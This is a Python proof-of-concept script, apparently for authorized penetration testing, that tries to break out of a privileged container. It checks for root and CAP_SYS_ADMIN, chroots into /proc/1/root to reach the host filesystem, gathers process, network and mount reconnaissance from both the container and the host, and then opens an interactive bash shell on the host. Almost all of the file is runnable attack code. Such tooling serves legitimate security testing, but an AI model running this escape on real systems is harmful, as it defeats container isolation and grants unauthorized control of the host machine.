#!/usr/bin/env python3
"""
Container Escape with Comparative Reconnaissance PoC
----------------------------------------------------
This script collects baseline reconnaissance data from within the container,
attempts a chroot escape into the host filesystem via /proc/1/root, then collects
the same data from the host. Finally, it compares the two sets of results to
confirm the escape and illustrate differences in impact.

CAUTION: Use only in authorized testing environments.
"""

import os
import subprocess
import sys
from datetime import datetime

def run_command(command, timeout=10):
    """Run a shell command and return its output."""
    try:
        result = subprocess.run(
            command, shell=True, check=False,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

def gather_recon_data(context="container"):
    """
    Gather a set of reconnaissance data.
    context: A label used for reporting (e.g. 'container' or 'host').
    Returns a dictionary with key information.
    """
    print(f"[*] Gathering {context} reconnaissance data...")
    recon = {}
    recon["Kernel & OS Info"] = run_command("uname -a")
    recon["OS Release"] = run_command("cat /etc/os-release")
    recon["Hostname"] = run_command("cat /etc/hostname")
    recon["System Uptime"] = run_command("cat /proc/uptime")
    recon["Mounted Filesystems"] = run_command("cat /proc/mounts")
    recon["Active Network Connections"] = run_command("ss -tulnp")  # or netstat -tulnp if ss is unavailable
    recon["Process Listing"] = run_command("ps aux")
    return recon

def print_comparison(container_data, host_data):
    """
    Compare container recon data to host recon data and print differences.
    """
    print("\n===== COMPARISON OF RECONNAISSANCE DATA =====")
    keys = container_data.keys() & host_data.keys()
    for key in sorted(keys):
        print(f"\n--- {key} ---")
        print("Inside Container:")
        print(container_data[key] if container_data[key] else "[No data]")
        print("\nFrom Host (post-escape):")
        print(host_data[key] if host_data[key] else "[No data]")
    print("==============================================\n")

def check_escape_capabilities():
    """Check if required privileges and access are present for escape."""
    capabilities = {}
    capabilities["proc_1_root_access"] = os.access("/proc/1/root", os.R_OK)
    cap_info = run_command("capsh --print")
    capabilities["cap_sys_admin"] = "cap_sys_admin" in cap_info.lower()
    capabilities["is_root"] = (os.geteuid() == 0)
    print("[*] Escape Capability Check:")
    for k, v in capabilities.items():
        print(f"    {k}: {v}")
    return capabilities

def escape_to_host():
    """
    Attempt to escape the container by chrooting into /proc/1/root.
    Returns True if escape is successful.
    """
    caps = check_escape_capabilities()
    if not (caps["proc_1_root_access"] and caps["cap_sys_admin"] and caps["is_root"]):
        print("[-] Required privileges or access not available for escape.")
        return False

    host_path = "/proc/1/root"
    test_file = os.path.join(host_path, "etc", "os-release")
    if not (os.path.exists(test_file) and os.access(test_file, os.R_OK)):
        print("[-] Key host file (etc/os-release) is not accessible via /proc/1/root.")
        return False

    try:
        print("[*] Attempting chroot escape using /proc/1/root...")
        os.chroot(host_path)
        os.chdir("/")  # change directory to new root
        print("[+] chroot successful! Now operating in host filesystem context.")
        return True
    except Exception as e:
        print(f"[-] chroot escape failed: {e}")
        return False

def main():
    print("==== Container Escape with Comparative Recon PoC ====")
    print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("CAUTION: This script is for authorized testing only.\n")
    
    # 1. Gather baseline data inside the container.
    container_recon = gather_recon_data(context="container")
    
    # 2. Attempt container escape via chroot.
    if not escape_to_host():
        print("[-] Container escape failed. Exiting.")
        sys.exit(1)
    
    # 3. Once escaped, gather host recon data.
    host_recon = gather_recon_data(context="host")
    
    # 4. Print a comparison report.
    print_comparison(container_recon, host_recon)
    
    # 5. Confirm proof-of-concept with an interactive shell if needed.
    try:
        print("[+] Launching interactive shell on the host (type 'exit' to quit)...")
        os.execvp("/bin/bash", ["/bin/bash"])
    except Exception as e:
        print(f"[-] Failed to launch interactive shell: {e}")

if __name__ == "__main__":
    main()
